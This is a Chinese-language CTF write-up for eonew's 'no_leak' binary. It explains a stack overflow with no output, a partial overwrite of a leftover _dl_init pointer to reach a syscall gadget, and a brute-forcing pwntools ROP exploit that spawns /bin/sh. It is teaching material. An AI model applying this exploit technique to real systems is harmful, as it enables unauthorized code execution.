# eonew  no_leak

这道题请教了Mr.R大佬，算是学会了一种~~乱七八糟~~的方法。

### 0x1 分析

```shell
➜  No_leak checksec no_leak
[*] './no_leak'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

地址固定，没有CANARY。

看一下程序逻辑，没有输出，只有一个`read()`来ROP。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-80h]

  alarm(0x3Cu);
  read(0, &buf, 0x100uLL);
  return 0;
}
```

本来是想着`ret2dl_resolve`的。但是奈何实力不足。然后大佬交给我一个新的方法。

看到这个栈空间里，有残留的栈信息，`_dl_init+259`这个位置如果可以部分写，来调用`syscall`，就再好不过了。

```shell
pwndbg> stack 50
00:0000│ rax rsi rsp  0x7fffffffe3c0 ◂— 0x0
... ↓
03:0018│              0x7fffffffe3d8 ◂— 0x756e6547 /* 'Genu' */
04:0020│              0x7fffffffe3e0 ◂— 9 /* '\t' */
05:0028│              0x7fffffffe3e8 —▸ 0x7ffff7dd7660 (dl_main) ◂— push   rbp
06:0030│              0x7fffffffe3f0 —▸ 0x7fffffffe458 —▸ 0x7fffffffe528 —▸ 0x7fffffffe77a ◂— '/root/pwn/eonew/No_leak/no_leak'
07:0038│              0x7fffffffe3f8 ◂— 0xf0b5ff
08:0040│              0x7fffffffe400 ◂— 0x1
09:0048│              0x7fffffffe408 —▸ 0x4005bd (__libc_csu_init+77) ◂— add    rbx, 1
0a:0050│              0x7fffffffe410 —▸ 0x7ffff7de59a0 (_dl_fini) ◂— push   rbp
0b:0058│              0x7fffffffe418 ◂— 0x0
0c:0060│              0x7fffffffe420 —▸ 0x400570 (__libc_csu_init) ◂— push   r15
0d:0068│              0x7fffffffe428 —▸ 0x400450 (_start) ◂— xor    ebp, ebp
0e:0070│              0x7fffffffe430 —▸ 0x7fffffffe520 ◂— 0x1
0f:0078│              0x7fffffffe438 ◂— 0x0
10:0080│ rbp          0x7fffffffe440 —▸ 0x400570 (__libc_csu_init) ◂— push   r15
11:0088│              0x7fffffffe448 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
12:0090│              0x7fffffffe450 ◂— 0x1
13:0098│              0x7fffffffe458 —▸ 0x7fffffffe528 —▸ 0x7fffffffe77a ◂— '/root/pwn/eonew/No_leak/no_leak'
14:00a0│              0x7fffffffe460 ◂— 0x100008000
15:00a8│              0x7fffffffe468 —▸ 0x400537 (main) ◂— push   rbp
16:00b0│              0x7fffffffe470 ◂— 0x0
17:00b8│              0x7fffffffe478 ◂— 0xd8d2b25377b34abc
18:00c0│              0x7fffffffe480 —▸ 0x400450 (_start) ◂— xor    ebp, ebp
19:00c8│              0x7fffffffe488 —▸ 0x7fffffffe520 ◂— 0x1
1a:00d0│              0x7fffffffe490 ◂— 0x0
... ↓
1c:00e0│              0x7fffffffe4a0 ◂— 0x272d4d2cb5f34abc
1d:00e8│              0x7fffffffe4a8 ◂— 0x272d5d93cbcd4abc
1e:00f0│              0x7fffffffe4b0 ◂— 0x7fff00000000
1f:00f8│              0x7fffffffe4b8 ◂— 0x0
... ↓
21:0108│              0x7fffffffe4c8 —▸ 0x7ffff7de5733 (_dl_init+259) ◂— add    r14, 8
22:0110│              0x7fffffffe4d0 —▸ 0x7ffff7dcb638 (__elf_set___libc_subfreeres_element_free_mem__) —▸ 0x7ffff7b7de10 (free_mem) ◂— push   r13
```

在`ld.so`里

```assembly
.text:00000000000043E7                 syscall                 ; LINUX - sys_arch_prctl
```

所以只要部分写到这里就好了，由于地址随机。需要多尝试几次。

接下来考虑栈溢出到`_dl_init+259`,

```shell
pwndbg> distance 0x7fffffffe440 0x7fffffffe4c8
0x7fffffffe440->0x7fffffffe4c8 is 0x88 bytes (0x11 words)
```

由于输入的限制达不到我们覆盖的要求。需要滑动向下`rsp`。

```python
for i in range(3):
	payload = 'A' * 0x80 + p64(i+1) + p64(main)
	p.send(payload)
```

通过返回`main`来向下`rsp`，每次可以向下滑动`0x8`。（其实滑动两次就够了。滑动三次更好）

接下来就是控制`rax`和`rdi`、`rsi`、`rdx`。

可以通过调用`read()`在`.bss`写入`/bin/sh\x00`。顺便控制`rax`。接着`csu`控制其他寄存器。最后`payload`写到部分写的位置，修改`_dl_init+259`到`syscall`。

#### 还有一种方法

在`bss`里写入`_start`和`main`接下来返回`_start`来部分写到这里

```assembly
.text:0000000000021C70                 lea     rsi, aGnuCLibraryUbu ; "GNU C Library (Ubuntu GLIBC 2.27-3ubunt"...
.text:0000000000021C77                 mov     edx, 1AFh
.text:0000000000021C7C                 mov     edi, 1
.text:0000000000021C81                 jmp     write
```

来泄漏`libc`。然后返回到`main`控制`rip`为`gadget`。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

def debug(p, cmd):
    gdb.attach(p, cmd)
    pause()

while True:
    try:
        p = process("./no_leak")
        elf = ELF("./no_leak")


        # gdb.attach(p,"b *0x40055A\n")
        read = elf.plt['read']
        syscall = '\xe7\x03'
        pop_rdi = 0x00000000004005d3
        pop_rsi_15 = 0x00000000004005d1
        bss = 0x601500
        ret = 0x0000000000400416
        pop_r15 = 0x00000000004005d2
        main = 0x400537

        # change stack back
        for i in range(3):
            payload = 'A' * 0x80 + p64(i+1) + p64(main)
            p.send(payload)
            # pause()
        # get shell
        ## rax & sh
        payload = 'A' * 0x80 + p64(1) + p64(pop_rsi_15 ) +p64(bss) + p64(0) + p64(read)
        ## csu
        payload += p64(0x4005CC) + p64(bss + 0x8) + p64(bss + 0x10) + p64(0 )+ p64(0) + p64(0x4005B0)
        ## syscall
        payload += p64(ret) * 3 + syscall
        p.send(payload)
        ## read
        payload = p64(0) + p64(pop_r15) + "/bin/sh\x00"
        payload = payload.ljust(0x3b, '\x00')
        p.send(payload)
        p.interactive()
        # break
    except:
        p.close()
```

